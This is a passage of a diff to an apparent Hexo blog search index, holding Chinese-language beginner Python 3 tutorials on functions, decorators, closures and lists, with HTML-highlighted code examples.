class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        num.append(a)</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">fn2 = fn()</span><br><span class="line"><span class="built_in">print</span>(fn2(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>在不修改原函数的情况下，对原函数进行修改</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn_1</span>(<span class="params">old</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fn_2</span>():</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		result = old()	<span class="comment"># 调用传入的参数</span></span><br><span class="line">        <span class="comment"># 这里使用变量保存，如果直接return会直接结束函数，后面的语句就不能执行</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> result</span><br><span class="line">	<span class="keyword">return</span> fn_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@fn_1	</span><span class="comment"># 把函数fn3传入fn_1，利用fn_1装饰fn3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn3</span>():</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;大家好&#x27;</span>)</span><br><span class="line">fn3()</span><br><span class="line">--------------------</span><br><span class="line">大家好</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python3-基础语法</title>
     <url>//3df47f907de1.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -645,119 +840,130 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-函数</title>
-    <url>//a7d380d29206.html</url>
-    <content><![CDATA[<h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><p>​        通过将一段有规律的、重复的代码定义为函数，来达到一次编写、多次调用的目的。使用函数可以提高代码的重复利用率。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">形参<span class="number">1</span>,形参<span class="number">2</span>,形参<span class="number">3.</span>..形参n</span>)</span></span><br><span class="line"><span class="function">	代码块</span></span><br><span class="line"><span class="function"># 定义形参就相当于声明了变量，但是不赋值</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">调用函数</span></span><br><span class="line"><span class="function">函数对象(<span class="params">实参</span>)</span></span><br><span class="line"><span class="function"># 形参可以指定默认值，当用户没有指定形参时，默认值才会生效</span></span><br><span class="line"><span class="function"># 在定义函数时，可以在形参前面加上一个*，这样这个形参就会获取到所有的实参，保存在一个元组中</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="实参的传递方式"><a href="#实参的传递方式" class="headerlink" title="实参的传递方式"></a>实参的传递方式</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><p>位置参数就是将对应位置的实参复制给对应位置的形参</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>当形参指定了默认值，并且该形参没有赋值，使用默认值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(a=<span class="number">1</span>,b=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 当c没有赋值时，使用默认值c=10</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>使用形式参数的名字来确定输入的参数值。通过此方式指定函数实参时，不再需要与形参的位置完全一致，只要将参数名写正确即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(c=<span class="number">3</span>,b=<span class="number">2</span>,a=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># *形参只能接收位置参数，而不能接收关键字参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,*c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># **形参可以接收其他的关键字参数，它会将这些参数统一保存到一个字典中</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">fn</span>(<span class="params">a,b,**c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params">a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">d = &#123;&#x27;a&#x27;:100,&#x27;b&#x27;:200,&#x27;c&#x27;:300&#125;</span><br><span class="line">fn(**d)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>)</span></span><br><span class="line">变量 = (1,2,3)</span><br><span class="line">fn(*变量)</span><br><span class="line">变量 = (a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">fn(**变量)</span><br><span class="line"><span class="comment">#可以是任意序列或者字典，个数与形参一样，字典用**表示</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>​        在Python中，可以在函数体内使用return语句为函数指定返回值，为函数设置返回值的作用就是将函数的处理结果返回给调用它的函数。该返回值可以是任意类型，并且无论return语句出现在函数的什么位置，只要得到执行，就会直接结束函数的执行。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn2</span>() :</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fn2()</span><br><span class="line">fn()</span><br><span class="line"><span class="comment"># 这个函数的执行结果就是它的返回值，也可以 变量 = fn()</span></span><br><span class="line"><span class="comment"># return后面可以跟任意形式的值，return后的代码都不会执行，可以用来结束函数</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文档字符串"><a href="#文档字符串" class="headerlink" title="文档字符串"></a>文档字符串</h2><p>文档字符串就是一个函数的使用说明</p>
-<p>可以使用<code>help()</code>函数查看该函数的使用说明</p>
-<p>使用三引号创建文档字符串</p>
-<h2 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h2><p>作用域就是指变量生效的区域，在执行时创建，在执行结束时销毁</p>
-<p><strong>全局作用域</strong></p>
-<p>所有函数以外的区域都是全局作用域，可以在程序的任意位置被访问</p>
-<p><strong>函数作用域</strong></p>
-<p>在函数作用域中定义的变量，都是局部变量，它只能在函数内部被访问</p>
-<p><strong>可以使用 global 变量，来声明变量是全局变量</strong></p>
-<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>每一个作用域都会有一个它对应的命名空间，是一个专门用来存储变量的字典</p>
-<p>全局命名空间，用于保存全局变量。函数命名空间用来保存函数中的变量</p>
-<p><code>locals()</code>用来获取当前作用域的命名空间，返回的是一个字典</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量 = <span class="built_in">locals</span>()</span><br><span class="line"><span class="comment"># 当前命名空间</span></span><br><span class="line"><span class="built_in">globals</span>()</span><br><span class="line"><span class="comment"># 函数可以用来在任意位置获取全局命名空间</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归（Recursion），就是指在函数的定义中使用函数自身的方法</p>
-<p>如果函数中包含了对自身的调用，该函数就是使用了递归的方法</p>
-<p>函数自己调用自己，和循环类似</p>
-<p>它的整体思想是，将一个大问题分解为一个个的小问题，直到问题无法分解时，再去解决问题</p>
-<p>递归函数的两个要件</p>
-<ul>
-<li>基线条件：确定递归到何时终止，函数不在调用自己</li>
-<li>递归条件：将问题继续分解的条件</li>
+    <title>Python3-数组</title>
+    <url>//ecee3d177b80.html</url>
+    <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
+<li>列表(list): 是序列中的可变序列</li>
+<li>元组(tuple): 是序列中的不可变序列</li>
+<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
+<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例1：判断任意数的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">n</span>):</span></span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> n * fn(n-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例2：判断是否为回文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">n</span>) :</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(n) &lt; <span class="number">2</span> :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">elif</span> n[<span class="number">0</span>] != n[-<span class="number">1</span>] :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> fn1(n[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="string">&#x27;abcdcba&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>​    序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，每个值（称为元素）都分配一个数字，称为索引或位置。通过该索引可以取出相应的值。</p>
+<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Python中的列表是由一系列按特定顺序排列的元素组成。它是Python中内置的可变序列。</p>
+<p>在形式上，列表的所有元素都放在一对中括号“[]”中，两个相邻元素间使用逗号“,”分隔。</p>
+<p>在内容上，可以将整数、实数、字符串、列表、元组等任何类型的内容放入列表中，并且同一个列表中，元素的类型可以不同，因为它们之间没有任何关系。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 = [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">type</span>(a) = <span class="built_in">list</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="匿名函数（lambda）"><a href="#匿名函数（lambda）" class="headerlink" title="匿名函数（lambda）"></a>匿名函数（lambda）</h2><p>lambda函数表达式专门用来创建一些简单的函数，可以创建一次性的函数，不需要为函数命名</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">lambda</span> 参数列表 : 返回值</span><br><span class="line"></span><br><span class="line">r = (<span class="keyword">lambda</span> a,b : a+b)(<span class="number">10</span>,<span class="number">20</span>)</span><br><span class="line">fn = <span class="keyword">lambda</span> a,b : a+b</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>,<span class="number">20</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
+<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>])</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">1</span>])</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>接收函数作为参数，或者将函数作为返回值的函数是高阶函数</p>
-<p>当我们使用一个函数作为参数时，实际上是将指定的代码传递进了目标函数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 把判断传参是否是2的倍数，如果是返回True，否则返回False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">func,lst</span>):</span></span><br><span class="line">    new_list = []</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">if</span> func(n):</span><br><span class="line">            new_list.append(n)</span><br><span class="line">    <span class="keyword">return</span> new_list</span><br><span class="line"><span class="comment"># 遍历形参lst,如果n传入形参func函数的结果为True,则把n传入新列表，最后返回新列表</span></span><br><span class="line"><span class="built_in">print</span>(fn(fn2,l))</span><br><span class="line"><span class="comment"># 调用函数fn,把函数fn2传入形参func,把列表l传入形参lst</span></span><br></pre></td></tr></table></figure>
+<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>获取多个索引称为切片</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为<span class="number">1</span>，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(a[:])</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h2><p><code>filter()</code>用于过滤序列，过滤掉不符合条件的元素</p>
-<p><code>filter()</code>函数本身不对序列作任何修改</p>
-<p><code>filter()</code>函数返回的结果是一个迭代器对象</p>
-<p>接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment">#  1.函数，根据该函数来过滤序列（可迭代的结构）</span></span><br><span class="line"><span class="comment">#  2.需要过滤的序列（可迭代的结构）</span></span><br><span class="line"><span class="comment"># 返回值：</span></span><br><span class="line"><span class="comment">#   过滤后的新序列（可迭代的结构）</span></span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>) :</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line">r = <span class="built_in">filter</span>(fn2,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(r))</span><br></pre></td></tr></table></figure>
+<h3 id="修改列表"><a href="#修改列表" class="headerlink" title="修改列表"></a>修改列表</h3><p>可以用切片修改列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名[起始索引:结束索引:步长] = [元素<span class="number">1</span>,元素<span class="number">2.</span>.....]</span><br><span class="line">a[<span class="built_in">len</span>(a):]=[<span class="number">11</span>]	结尾增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">0</span>]=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 固定位置或者开头增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 修改前三个</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="map-函数"><a href="#map-函数" class="headerlink" title="map()函数"></a>map()函数</h2><p><code>map()</code>会根据提供的函数对指定序列做映射</p>
-<p><code>map()</code>函数返回的结果是一个迭代器对象</p>
-<p>用来通过函数修改列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="built_in">map</span>(函数,列表)</span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line">b = <span class="built_in">map</span>(a,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(b))</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>
+<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><p>通过for循环遍历列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历列表和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h2><p>通过<code>sort()</code>函数对序列排序</p>
-<p>在<code>sort()</code>可以接收一个关键字参数 ，key</p>
-<p>key需要一个函数作为参数，当设置了函数作为参数</p>
-<p>每次都会以列表中的一个元素作为参数来调用函数，并且使用函数的返回值来比较元素的大小</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a.sort(key=fn)</span><br><span class="line"><span class="comment"># 这里通过函数fn()获取到列表的第二位</span></span><br><span class="line"><span class="comment"># 2,4,1,3</span></span><br><span class="line"><span class="comment"># 然后通过列表的sort()方法对2,4,1,3做默认升序排序</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">[(<span class="number">4</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure>
+<h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name &#x3D; [表达式 for 变量 in 序列]</span><br><span class="line">import random</span><br><span class="line">a &#x3D; [random.randint(1,100) for i in range(10)]</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name &#x3D; [表达式 for 变量 in 序列 条件语句]</span><br><span class="line">a &#x3D; [1,2,3,4,5,6]</span><br><span class="line">b &#x3D; [i+1 for i in a if i&gt;0]</span><br><span class="line">print(b)</span><br><span class="line">[2,3,4,5,6,7]</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h2><p>这个函数和<code>sort()</code>的用法基本一致，但是sorted()可以对任意的序列进行排序</p>
-<p>并且使用sorted()排序不会影响原来的对象，而是返回一个新对象</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">2</span>,<span class="number">5</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]</span><br><span class="line">l = <span class="string">&quot;123765816742634781&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(l,key=<span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>, <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h3 id="方法-method"><a href="#方法-method" class="headerlink" title="方法(method)"></a>方法(method)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">append()方法:添加元素</span><br><span class="line">对象名.append(新元素)</span><br><span class="line"></span><br><span class="line">index()方法:返回具有指定值的第一个元素的索引</span><br><span class="line">print(对象名.index(元素,起始索引,结束索引))	#起始和结束位置可以省略</span><br><span class="line"></span><br><span class="line">count()方法:统计指定元素出现的次数</span><br><span class="line">对象名.count(元素)</span><br><span class="line"></span><br><span class="line">insert()方法:按指定位置添加元素</span><br><span class="line">对象名.insert(索引,新元素)</span><br><span class="line"></span><br><span class="line">remove()方法:删除指定元素，有多个相同元素只会删除第一个</span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line">pop()方法:删除指定索引，如未指定索引，默认删除最后一个</span><br><span class="line">对象名.pop(索引)</span><br><span class="line"></span><br><span class="line">del 方法:删除列表</span><br><span class="line">del 列表名    #也可以用 del 列表名[索引] 来删除指定索引</span><br><span class="line"></span><br><span class="line">clear()方法:清空列表</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制列表</span><br><span class="line">变量 &#x3D; 对象名.copy()</span><br><span class="line"></span><br><span class="line">list()方法:复制列表	#也可以使用此函数把其他序列转换为列表</span><br><span class="line">变量 &#x3D; list(对象名)</span><br><span class="line"></span><br><span class="line">extend()方法:合并列表</span><br><span class="line">对象1.extend(对象2&#x2F;元素)</span><br><span class="line"></span><br><span class="line">reverse()方法:颠倒列表顺序</span><br><span class="line">对象名.reverse()</span><br><span class="line"></span><br><span class="line">sort()方法:对列表排序</span><br><span class="line">对象名.sort()				#默认为升序</span><br><span class="line">对象名.sort(reverse&#x3D;True)	#降序</span><br><span class="line"></span><br><span class="line">sorted()方法:对列表排序</span><br><span class="line">对象名.sorted()				#默认为升序</span><br><span class="line">对象名.sorted(reverse&#x3D;True)	#降序</span><br><span class="line">列表对象的sort()方法和内置sorted()函数的作用基本相同</span><br><span class="line">所不同的就是使用sort()方法时，会改变原列表的元素排列顺序</span><br><span class="line">但是使用sorted()函数时，会建立一个原列表的副本，该副本为排序后的列表</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>将函数作为返回值返回，也是一种高阶函数,叫做闭包</p>
-<p>通过闭包可以创建一些只有当前函数能访问的变量</p>
-<p>可以将一些私有的数据藏到的闭包中</p>
-<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">直接调用函数</button></li><li class="tab"><button type="button" data-href="#-2">返回函数名称</button></li><li class="tab"><button type="button" data-href="#-3">利用闭包保存变量的值</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    fn1(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line">fn(<span class="string">&quot;name&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">	<span class="comment"># 此处不直接调用，而是返回函数名称（Python中一切皆对象）</span></span><br><span class="line">fn2 = fn(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="comment"># 调用包装器</span></span><br><span class="line">fn2(<span class="number">10</span>,<span class="number">20</span>,<span 